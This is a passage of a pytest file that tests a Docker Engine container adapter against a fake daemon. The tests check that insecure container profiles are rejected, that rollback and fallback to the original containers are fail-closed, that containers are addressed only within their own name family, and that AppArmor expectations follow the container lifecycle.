    {"security_opt": ("seccomp=unconfined",)}, {"readonly_rootfs": False}, {"env": {}},
    {"security_opt": ("no-new-privileges=false",)}, {"security_opt": ("no-new-privileges:false",)},
    {"security_opt": ("label=type:spc_t",)}, {"security_opt": ("apparmor=custom-permissive",)},
    {"security_opt": ("seccomp=/srv/permissive.json",)},
    {"port_bindings": (EnginePortBinding(container_port=8000, host_ip="127.0.0.1", host_port=18000),
                       EnginePortBinding(container_port=8000, host_ip="127.0.0.1", host_port=18000))},
    {"port_bindings": (EnginePortBinding(container_port=9000, host_ip="127.0.0.1", host_port=19000),)},
    {"working_dir": "relative"}, {"tmpfs": {"/srv/served": "rw"}}, {"tmpfs": {"/proc/x": "rw"}},
    {"env_names": ("VKM_A", "VKM_A")}, {"environment": None}])
def test_profile_rejects_unapproved_create_capabilities(tmp_path, update):
    with pytest.raises(ValueError):  # includes Env names without a pinned file, or a file without names
        profile("api", tmp_path / "runtime" / "served", **update)


# ------------------------------------------------- first-LIVE integration --

def native_rig(world, *, scope="SYNTHETIC"):
    events = []
    for unit, ident in ORIGINALS.items():
        world.daemon.containers[ident] = legacy_doc(unit, ident)
    pins = {u: UnitPin(**container_fingerprint(world.daemon.containers[i], project="vkm-core", unit=u))
            for u, i in ORIGINALS.items()}
    adapter = object.__new__(NativeFirstLiveAdapters)
    adapter.intent = NS(scope=scope, sha256=INTENT_SHA, request_id="engine-create-test", engine_create=world.plan,
        legacy=NS(units=pins, original_container_ids=dict(ORIGINALS)),
        candidate_release=NS(compose="bound", units={u: UnitPin(image_id=IMAGE, config_sha256="c" * 64) for u in ORIGINALS}),
        frontdoor=NS(tcp_ports=(8000, 8765, 18000, 18765)),
        units=NS(docker_socket=E.ENGINE_SOCKET, control_root=str(world.root)))
    adapter.units = NS(_compose=lambda release: None, commands=NS(run=world.daemon.cli))
    adapter.fence = lambda **kw: None
    adapter.event = lambda phase, **detail: events.append(phase)
    adapter.engine = world.adapter()
    return adapter, events


def originals_intact(world, *, running):
    for unit, ident in ORIGINALS.items():
        doc = world.daemon.containers[ident]
        assert doc["unique_layer"] == "DO_NOT_LOSE_" + unit and doc["Config"]["Labels"]["com.docker.compose.project"] == "vkm-core"
        assert doc["State"]["Running"] is running
    assert not set(ORIGINALS.values()) & set(world.daemon.deleted)


def test_first_live_partial_start_then_fallback_preserves_original_ids_and_layers(world):
    adapter, events = native_rig(world)
    partial = adapter.candidate_start(partial=True)
    created = list(world.daemon.created)
    assert partial == {"started": {"api": created[0]}, "stopped": {"mcp": created[1]}}
    assert events == ["LEGACY_ORIGINAL_PARKED", "LEGACY_ORIGINAL_PARKED"]
    originals_intact(world, running=False)
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS
    assert world.daemon.deleted == created and set(world.daemon.containers) == set(ORIGINALS.values())
    originals_intact(world, running=True)
    full = adapter.candidate_start()
    assert set(full.values()) == set(world.daemon.created[2:]) and adapter.engine.current("api") == full["api"]
    adapter.legacy_restore()
    assert set(world.daemon.containers) == set(ORIGINALS.values())
    originals_intact(world, running=True)
    assert not any(c[0] == "rm" for c in world.daemon.cli_calls)


@pytest.mark.parametrize("phase", ["ATTEMPT_OPEN", "CREATE_ACK", "POST_CREATE_VERIFIED", "START_INTENT", "STARTED",
                                   ("CREATE_ACK", 2), ("POST_CREATE_VERIFIED", 2), "daemon-after-create",
                                   "daemon-after-start", "CREATE_INTENT"])
def test_rollback_after_each_side_effect_removes_only_owned_ids(world, phase):
    adapter, _ = native_rig(world)
    if phase == "daemon-after-create":
        world.daemon.hooks["after_create"] = lambda request, doc: (_ for _ in ()).throw(Crash("died"))
    elif phase == "daemon-after-start":
        world.daemon.hooks["after_start"] = lambda request, item: (_ for _ in ()).throw(Crash("died"))
    else:
        name, occurrence = phase if isinstance(phase, tuple) else (phase, 1)
        adapter.engine = world.adapter(fault=crash_at(name, occurrence))
    with pytest.raises(Crash):
        adapter.candidate_start(partial=True)
    world.daemon.hooks.clear()
    adapter.engine = world.adapter()  # a new process: only the durable journal is shared
    if phase == "CREATE_INTENT":
        with pytest.raises(E.EngineCreateAmbiguous):
            adapter.legacy_restore()  # the create could still be in flight: no fallback guess
        originals_intact(world, running=False)
        world.clock.now += world.plan.create_timeout_seconds + 1
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS
    assert sorted(world.daemon.deleted) == sorted(world.daemon.created)
    assert set(world.daemon.containers) == set(ORIGINALS.values())
    originals_intact(world, running=True)


def test_restore_after_a_late_create_removes_it_and_returns_the_originals(world):
    """F2: a create that materialises after the deadline guess no longer strands the originals."""
    adapter, _ = native_rig(world)
    held = {}

    def lost(request, name, body):
        held["late"] = (name, body)
        raise httpx.ReadTimeout("daemon still creating", request=request)
    world.daemon.hooks["before_create"] = lost
    with pytest.raises(E.EngineCreateAmbiguous):
        adapter.candidate_start(partial=True)
    world.daemon.hooks.clear()
    world.clock.now += world.plan.create_timeout_seconds + 1
    cli = world.daemon.cli

    def late_cli(kind, argv):
        if argv[0] == "rename" and "late" in held:
            name, body = held.pop("late")
            held["ident"] = world.daemon.new_id()
            world.daemon.containers[held["ident"]] = world.daemon.materialize(held["ident"], name, body)
        return cli(kind, argv)
    adapter.units.commands = NS(run=late_cli)
    with pytest.raises((GenerationUnavailable, FirstLiveError)):
        adapter.legacy_restore()  # the late container took the original name during the rename
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS
    assert held["ident"] in world.daemon.deleted and "OCCUPANT_OWNED" in phases(world.journal)
    originals_intact(world, running=True)


def test_restarting_candidate_is_stopped_and_removed_so_fallback_completes(world):
    """F4: a crash-looping journal-owned candidate never blocks the legacy fallback."""
    adapter, _ = native_rig(world)
    adapter.candidate_start(partial=True)
    api = adapter.engine.current("api")
    world.daemon.containers[api]["State"].update(Running=True, Restarting=True, Pid=0, Status="restarting")
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS and api in world.daemon.deleted
    originals_intact(world, running=True)
    with pytest.raises(ValueError):
        EngineRestartPolicy(name="always")


def test_fallback_never_displaces_a_foreign_container_at_the_original_name(world):
    adapter, _ = native_rig(world)
    adapter.candidate_start(partial=True)
    adapter._remove_owned()
    world.daemon.containers["9" * 64] = dict(legacy_doc("api", "9" * 64), Name="/vkm-core-api-1")
    with pytest.raises(FirstLiveError, match="unknown native"):
        adapter.legacy_restore()
    assert "9" * 64 in world.daemon.containers and world.daemon.deleted == world.daemon.created
    originals_intact(world, running=False)


def test_unbound_or_absent_engine_adapter_never_falls_back_to_compose(world, tmp_path):
    adapter, _ = native_rig(world)
    release = adapter.intent.candidate_release
    create = lambda: adapter._create(release.compose, release.units)
    with pytest.raises(FirstLiveError, match="not the intent"):
        adapter._create("another-compose", release.units)
    adapter.engine = world.adapter(plan=make_plan(world.root, user="10002:10002"))
    with pytest.raises(FirstLiveError, match="not bound"):
        create()
    adapter.engine = world.adapter(intent="f" * 64)
    with pytest.raises(FirstLiveError, match="not bound"):
        adapter._remove_owned()
    # N9: the journal must be the intent's fixed journal inside its control root.
    other = tmp_path / "elsewhere"
    other.mkdir()
    adapter.engine = world.adapter(journal_path=engine_journal_path(str(other), INTENT_SHA))
    with pytest.raises(FirstLiveError, match="not bound"):
        adapter._remove_owned()
    del adapter.engine
    for call in (create, adapter._remove_owned, adapter.candidate_start):
        with pytest.raises(FirstLiveNotReady):
            call()
    assert world.daemon.mutations() == [] and not any(c[0] in {"stop", "rename", "start"} for c in world.daemon.cli_calls)


def test_cli_and_engine_must_address_the_same_pinned_daemon(world, tmp_path):
    """F5: a different socket for the Engine adapter, or another daemon behind the CLI, is refused."""
    from vkm_corpus.update.first_live import FirstLiveIntent
    value = intent_value(tmp_path, production=True)
    value["units"]["docker_socket"] = str(tmp_path / "rootless" / "docker.sock")
    assert FirstLiveIntent.model_validate(value).units.docker_socket.endswith("docker.sock")
    adapter, _ = native_rig(world)
    adapter.intent.units = NS(docker_socket="/run/user/1000/docker.sock", control_root=str(world.root))
    with pytest.raises(FirstLiveError, match="not bound"):
        adapter._remove_owned()
    adapter.intent.units = NS(docker_socket=E.ENGINE_SOCKET, control_root=str(world.root))
    cli = world.daemon.cli
    adapter.units.commands = NS(run=lambda kind, argv: canonical_bytes("ANOTHER:DAEMON:ID")
                                if argv[0] == "info" else cli(kind, argv))
    with pytest.raises(FirstLiveError, match="different daemons"):
        adapter._create(adapter.intent.candidate_release.compose, adapter.intent.candidate_release.units)
    assert world.daemon.requests == []


@pytest.mark.parametrize("scope", ["FIRST_LIVE_PRODUCTION", None])
def test_engine_adapter_cannot_unblock_production_mutations(world, scope):
    adapter, _ = native_rig(world, scope=scope)
    create = lambda: adapter._create(adapter.intent.candidate_release.compose, adapter.intent.candidate_release.units)
    for call in (create, adapter._remove_owned, adapter.candidate_start, adapter.legacy_restore):
        with pytest.raises(FirstLiveNotReady):
            call()
    assert world.daemon.requests == [] and world.daemon.cli_calls == []
    with pytest.raises(FirstLiveNotReady):
        NativeFirstLiveAdapters(NS(scope="FIRST_LIVE_PRODUCTION", engine_create=world.plan))


# ------------------------------------------------- challenger round 2 (R1-R5) --

@pytest.mark.parametrize("kind", ["cli-daemon-id", "engine-upgraded", "image-gone", "mount-source-gone"])
def test_bind_and_daemon_drift_refuse_before_any_original_is_parked(world, kind):
    """R1: identity/daemon/image/mount drift fails before stop+rename; the pure fallback still works."""
    adapter, events = native_rig(world)
    if kind == "cli-daemon-id":
        cli = world.daemon.cli
        adapter.units.commands = NS(run=lambda k, argv: canonical_bytes("OTHER:DAEMON") if argv[0] == "info" else cli(k, argv))
    elif kind == "engine-upgraded":
        world.daemon.version["Version"] = "99.0.0"  # e.g. an unattended Engine upgrade
    elif kind == "image-gone":
        world.daemon.images.clear()
    else:
        (world.root.parent / "data").rmdir()
    with pytest.raises((FirstLiveError, E.EngineCreateError)):
        adapter.candidate_start(partial=True)
    assert events == [] and not any(c[0] in {"stop", "rename", "start"} for c in world.daemon.cli_calls)
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS
    originals_intact(world, running=True)
    assert world.daemon.mutations() == [] and not Path(world.journal).exists()


@pytest.mark.parametrize("kind", ["cli-daemon-id", "engine-upgraded"])
def test_parked_originals_return_despite_identity_drift_when_no_engine_effect_exists(world, kind):
    """R1: an empty write-ahead journal proves no Engine create; originals return under the occupant guard."""
    adapter, events = native_rig(world)
    adapter._park_legacy()  # e.g. a process death after parking, before any Engine create intent
    originals_intact(world, running=False)
    if kind == "cli-daemon-id":
        cli = world.daemon.cli
        adapter.units.commands = NS(run=lambda k, argv: canonical_bytes("OTHER:DAEMON") if argv[0] == "info" else cli(k, argv))
    else:
        world.daemon.version["Version"] = "99.0.0"
    world.daemon.containers["9" * 64] = dict(legacy_doc("mcp", "9" * 64), Name="/vkm-core-mcp-1")
    with pytest.raises(FirstLiveError, match="unknown native"):
        adapter.legacy_restore()  # an unknown occupant is still never displaced
    del world.daemon.containers["9" * 64]
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS
    originals_intact(world, running=True)
    assert world.daemon.mutations() == [] and not Path(world.journal).exists()


def test_identity_drift_with_journaled_effects_keeps_rollback_fail_closed(world):
    """R1: once the journal holds effects, rollback still requires the exact pinned daemon."""
    adapter, _ = native_rig(world)
    adapter.candidate_start(partial=True)
    world.daemon.version["Version"] = "99.0.0"
    with pytest.raises(E.EngineUnavailable):
        adapter.legacy_restore()
    assert world.daemon.deleted == [] and len(world.daemon.created) == 2
    originals_intact(world, running=False)
    world.daemon.version["Version"] = "27.3.1"  # the pinned daemon identity is re-established
    restored = adapter.legacy_restore()
    assert {u: v["container_id"] for u, v in restored.items()} == ORIGINALS
    assert sorted(world.daemon.deleted) == sorted(world.daemon.created)


@pytest.mark.parametrize("problem", ["symlink", "socket", "device", "fifo", "missing"])
def test_preflight_refuses_indirect_or_special_mount_sources(world, monkeypatch, problem):
    """R2: the mount policy is checked natively on the Engine host, not only lexically."""
    data = world.root.parent / "data"
    if problem == "symlink":
        real = world.root.parent / "real-data"
        real.mkdir()
        data.rmdir()
        try:
            data.symlink_to(real, target_is_directory=True)
        except OSError:  # unprivileged Windows cannot create the link: emulate its native observation
            data.mkdir()
            is_symlink = E.Path.is_symlink
            monkeypatch.setattr(E.Path, "is_symlink", lambda self: self == data or is_symlink(self))
    elif problem == "missing":
        data.rmdir()
    else:
        real_stat = os.stat
        kind = {"socket": stat.S_IFSOCK, "device": stat.S_IFCHR, "fifo": stat.S_IFIFO}[problem]

        def fake_stat(path, *args, **kwargs):
            info = real_stat(path, *args, **kwargs)
            same = isinstance(path, (str, os.PathLike)) and Path(path) == data
            return os.stat_result((kind | 0o600,) + tuple(info)[1:]) if same else info
        monkeypatch.setattr(E.os, "stat", fake_stat)
    assert E.mount_source_problem(str(data)) is not None
    with pytest.raises(E.EngineContractDrift):
        world.adapter().create("api")
    assert world.daemon.mutations() == [] and not Path(world.journal).exists()


def test_symlinked_mount_source_into_a_forbidden_tree_is_refused_natively(tmp_path):
    """R2: on POSIX a link to /run resolves elsewhere; on Windows the link itself is refused."""
    link = tmp_path / "srv-sockets"
    try:
        link.symlink_to("/run" if os.name == "posix" else str(tmp_path), target_is_directory=True)
    except OSError:  # unprivileged Windows: no link, nothing to resolve
        assert E.mount_source_problem(str(tmp_path / "absent")) == "unavailable"
        return
    assert E.mount_source_problem(str(link)) == "indirect"
    if os.name == "posix":
        assert E.forbidden_host_path(os.path.realpath(str(link)))


def test_backward_clock_step_keeps_an_unattributable_late_candidate_fail_closed(world):
    """R5 (documented operator procedure): Created before the recorded intent is never auto-removed."""
    held = {}

    def lost(request, name, body):
        held["late"] = (name, body)
        raise httpx.ReadTimeout("lost", request=request)
    world.daemon.hooks["before_create"] = lost
    engine = world.adapter()
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.create("api")
    world.daemon.hooks.clear()
    name, body = held["late"]
    ident = world.daemon.new_id()
    world.daemon.containers[ident] = world.daemon.materialize(ident, name, body)
    world.daemon.containers[ident]["Created"] = rfc3339(world.clock.now - 5)  # daemon wall clock 5 s behind
    world.clock.now += world.plan.create_timeout_seconds + 1
    with pytest.raises(E.EngineCreateAmbiguous):
        engine.remove_owned()
    assert ident in world.daemon.containers and ident not in world.daemon.deleted
    assert phases(world.journal)[-1] != "ATTEMPT_CLOSED"


# ------------------------------------------------------ closed name families --

def test_profile_names_must_belong_to_the_plan_family(tmp_path):
    root = tmp_path / "runtime" / "served"
    production = {u: profile(u, root) for u in ("api", "mcp")}
    qualification = {u: profile(u, root, family="QUALIFICATION") for u in ("api", "mcp")}
    assert qualification["api"].name == "vkm-l1q-api-1" and production["mcp"].name == "vkm-core-mcp-1"
    with pytest.raises(ValueError, match="name family"):
        EngineCreatePlan(api_version="1.44", daemon=DAEMON, name_family="QUALIFICATION", profiles=production)
    with pytest.raises(ValueError, match="name family"):
        EngineCreatePlan(api_version="1.44", daemon=DAEMON, profiles=qualification)  # default PRODUCTION
    with pytest.raises(ValueError, match="name family"):
        EngineCreatePlan(api_version="1.44", daemon=DAEMON, name_family="QUALIFICATION",
                         profiles={"api": qualification["api"], "mcp": production["mcp"]})
    for bad in ("vkm-l1q-mcp-1", "vkm-x-api-1", "vkm-l1q-api-2"):
        with pytest.raises(ValueError):
            profile("api", root, name=bad)
    with pytest.raises(ValueError):
        EngineCreatePlan(api_version="1.44", daemon=DAEMON, name_family="STAGING", profiles=production)


@pytest.mark.parametrize("family,own,other", [("QUALIFICATION", "vkm-l1q", "vkm-core"), ("PRODUCTION", "vkm-core", "vkm-l1q")])
def test_transport_addresses_only_its_own_name_family(family, own, other):
    daemon = FakeDaemon(prefix=own)
    t = EngineTransport("1.44", transport=daemon.transport(), name_family=family)
    for unit in ("api", "mcp"):
        assert t.inspect(own + "-" + unit + "-1") is None  # reaches the daemon (404)
        for call in (lambda: t.inspect(other + "-" + unit + "-1"),
                     lambda: t.create(other + "-" + unit + "-1", {"Image": IMAGE}, timeout=1),
                     lambda: t._request("inspect", params={"ref": other + "-" + unit + "-1"})):
            with pytest.raises(E.EngineRequestRefused):
                call()
    assert [p for _, p, _ in daemon.requests] == ["/v1.44/containers/" + own + "-api-1/json",
                                                  "/v1.44/containers/" + own + "-mcp-1/json"]
    with pytest.raises(E.EngineRequestRefused):
        EngineTransport("1.44", transport=daemon.transport(), name_family="STAGING")


def test_qualification_adapter_never_addresses_production_names(tmp_path):
    root = tmp_path / "runtime" / "served"
    root.mkdir(parents=True)
    (root / "admission.lock").touch()
    (root.parent / "data").mkdir()
    daemon, clock = FakeDaemon(prefix="vkm-l1q"), Clock()
    daemon.clock = clock
    production = {}
    for unit, ident in ORIGINALS.items():  # live production receivers on the same daemon
        daemon.containers[ident] = legacy_doc(unit, ident)
        production[ident] = copy.deepcopy(daemon.containers[ident])
    plan = make_plan(root, family="QUALIFICATION")
    engine = EngineCreateAdapter(plan, journal_path=engine_journal_path(str(root), INTENT_SHA), intent_sha256=INTENT_SHA,
        preserved_ids=ORIGINALS.values(), transport=daemon.transport(), clock=clock)
    ids = {u: engine.create(u) for u in ("api", "mcp")}
    assert {daemon.containers[i]["Name"] for i in ids.values()} == {"/vkm-l1q-api-1", "/vkm-l1q-mcp-1"}
    engine.start("api")
    assert sorted(engine.remove_owned()) == sorted(ids.values())
    assert {i: daemon.containers[i] for i in ORIGINALS.values()} == production
    paths = [p for _, p, _ in daemon.requests]
    assert not any("vkm-core" in p for p in paths) and not any(i in p for i in ORIGINALS.values() for p in paths)


def test_first_live_intent_refuses_a_qualification_plan(tmp_path):
    from vkm_corpus.update.first_live import FirstLiveIntent
    value = intent_value(tmp_path)
    value["engine_create"]["name_family"] = "QUALIFICATION"
    for unit in ("api", "mcp"):
        value["engine_create"]["profiles"][unit]["name"] = "vkm-l1q-" + unit + "-1"
    with pytest.raises(ValueError, match="PRODUCTION name family"):
        FirstLiveIntent.model_validate(value)


# ------------------------------------------------- lifecycle-aware AppArmor (L1 attempt 1) --

APPARMOR_CASES = [
    # (explicit apparmor opt, daemon has AppArmor, phase, reported profile, expected to verify)
    (False, True, "created", "", True),
    (False, True, "created", "docker-default", False),  # Docker does not fill it before the first start
    (False, True, "created", "unconfined", False),
    (False, True, "started", "docker-default", True),
    (False, True, "started", "", False),
    (False, True, "started", "unconfined", False),
    (True, True, "created", "docker-default", True),
    (True, True, "created", "", False),
    (True, True, "started", "docker-default", True),
    (True, True, "started", "unconfined", False),
    (False, False, "created", "", True),
    (False, False, "started", "", True),
    (False, False, "started", "docker-default", False),
]


@pytest.mark.parametrize("explicit,enabled,phase,reported,ok", APPARMOR_CASES)
def test_apparmor_expectation_follows_the_container_lifecycle(world, explicit, enabled, phase, reported, ok):
    if not enabled:
        world.daemon.info["SecurityOptions"] = ["name=seccomp,profile=builtin", "name=cgroupns"]
    daemon_pin = DAEMON if enabled else DAEMON.model_copy(update={"security_options": tuple(world.daemon.info["SecurityOptions"])})
    opts = ("no-new-privileges:true", "apparmor=docker-default") if explicit else ("no-new-privileges:true",)
    plan = make_plan(world.root, daemon=daemon_pin, security_opt=opts)
    engine = world.adapter(plan=plan)
    ident = engine.create("api")  # the fake reports what the real Engine reports here
    if phase == "started":
        engine.start("api")
    world.daemon.containers[ident]["AppArmorProfile"] = reported
    profile = plan.profiles["api"]
    _, _, fields = engine._observe(ident, profile, 1)
    assert (fields == []) is ok and (ok or fields == ["apparmor_profile"])
    pin = engine.observe("api", running=phase == "started")[1]
    assert (pin == engine.expected_pin("api")) is ok


def test_never_started_with_implicit_apparmor_creates_verifies_and_starts_like_docker_26(world):
    """The exact L1 attempt-1 sequence: created reports "", running reports docker-default."""
    engine = world.adapter()
    ids = {u: engine.create(u) for u in ("api", "mcp")}
    assert all(world.daemon.containers[i]["AppArmorProfile"] == "" for i in ids.values())
    assert "VERIFY_FAILED" not in phases(world.journal)
    engine.start("api")
    assert world.daemon.containers[ids["api"]]["AppArmorProfile"] == "docker-default"
    world.adapter().start("mcp")
    assert phases(world.journal).count("STARTED") == 2


@pytest.mark.parametrize("profile_value", ["", "docker-default"])
def test_lost_ack_adoption_uses_the_lifecycle_expectation(world, profile_value):
    def lost(request, doc):
        doc["AppArmorProfile"] = profile_value
        raise httpx.ReadTimeout("lost", request=request)
    world.daemon.hooks["after_create"] = lost
    engine = world.adapter()
    if profile_value == "":
        assert engine.create("api") == world.daemon.created[0]
        assert phases(world.journal)[-2:] == ["CREATE_ADOPTED", "POST_CREATE_VERIFIED"]
    else:
        with pytest.raises(E.EngineContractDrift):
            engine.create("api")
        assert phases(world.journal)[-1] == "CREATE_PARTIAL"


def test_inconsistent_lifecycle_never_matches_an_apparmor_expectation(world):
    engine = world.adapter()
    ident = engine.create("api")
    world.daemon.containers[ident]["State"].update(Running=True, Pid=77, Status="running")  # StartedAt still zero
    for value in ("", "docker-default"):
        world.daemon.containers[ident]["AppArmorProfile"] = value
        assert engine._observe(ident, world.plan.profiles["api"], 1)[2] == ["apparmor_profile"]
